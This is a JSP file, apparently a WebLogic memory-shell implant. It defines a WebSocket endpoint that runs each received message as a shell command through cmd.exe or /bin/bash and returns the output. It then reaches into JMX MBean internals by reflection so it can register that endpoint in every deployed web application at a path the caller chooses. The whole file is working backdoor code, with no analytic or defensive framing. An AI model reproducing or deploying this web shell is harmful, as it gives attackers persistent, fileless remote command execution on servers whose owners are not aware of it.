<%@ page import="javax.websocket.server.ServerEndpointConfig" %>
<%@ page import="javax.websocket.server.ServerContainer" %>
<%@ page import="javax.websocket.*" %>
<%@ page import="java.io.*" %>
<%@ page import="org.glassfish.tyrus.server.TyrusServerContainer" %>
<%@ page import="javax.management.MBeanServer" %>
<%@ page import="java.lang.management.ManagementFactory" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="com.sun.jmx.mbeanserver.Repository" %>
<%@ page import="com.sun.jmx.mbeanserver.NamedObject" %>
<%@ page import="java.util.Set" %>
<%@ page import="javax.management.ObjectName" %>
<%@ page import="java.util.HashSet" %>
<%@ page import="weblogic.servlet.internal.WebAppServletContext" %>

<%!
    public static class CmdEndpoint extends Endpoint implements MessageHandler.Whole<String> {
        private Session session;
        @Override
        public void onMessage(String s) {
            try {
                Process process;
                boolean bool = System.getProperty("os.name").toLowerCase().startsWith("windows");
                if (bool) {
                    process = Runtime.getRuntime().exec(new String[] { "cmd.exe", "/c", s });
                } else {
                    process = Runtime.getRuntime().exec(new String[] { "/bin/bash", "-c", s });
                }
                InputStream inputStream = process.getInputStream();
                StringBuilder stringBuilder = new StringBuilder();
                int i;
                while ((i = inputStream.read()) != -1)
                    stringBuilder.append((char)i);
                inputStream.close();
                process.waitFor();
                session.getBasicRemote().sendText(stringBuilder.toString());
            } catch (Exception exception) {
                exception.printStackTrace();
            }
        }
        @Override
        public void onOpen(final Session session, EndpointConfig config) {
            this.session = session;
            session.addMessageHandler(this);
        }
    }
%>
<%
    // 遍历所有 container 进行添加
    String path = request.getParameter("path");
    ServerEndpointConfig configEndpoint = ServerEndpointConfig.Builder.create(CmdEndpoint.class, path).build();
    MBeanServer server = ManagementFactory.getPlatformMBeanServer();
    Field field = server.getClass().getDeclaredField("wrappedMBeanServer");
    field.setAccessible(true);
    Object obj = field.get(server);
    field = obj.getClass().getDeclaredField("mbsInterceptor");
    field.setAccessible(true);
    obj = field.get(obj);
    field = obj.getClass().getDeclaredField("repository");
    field.setAccessible(true);
    Repository repository = (Repository)field.get(obj);
    Set<NamedObject> namedObjects = repository.query(new ObjectName("com.bea:Type=ApplicationRuntime,*"),null);
    for(NamedObject namedObject : namedObjects){
        field = namedObject.getObject().getClass().getDeclaredField("managedResource");
        field.setAccessible(true);
        obj = field.get(namedObject.getObject());
        field = obj.getClass().getSuperclass().getDeclaredField("children");
        field.setAccessible(true);
        HashSet set = (HashSet)field.get(obj);
        for(Object o : set){
            if(o.getClass().getName().endsWith("WebAppRuntimeMBeanImpl")){
                field = o.getClass().getDeclaredField("context");
                field.setAccessible(true);
                WebAppServletContext servletContext = (WebAppServletContext) field.get(o);
                TyrusServerContainer container = (TyrusServerContainer) servletContext.getAttribute(ServerContainer.class.getName());
                try {
                    container.register(configEndpoint);
                    out.println("add success,path: " + servletContext.getContextPath()+path);
                } catch (Exception e) {

                }
            }
        }
    }
%>
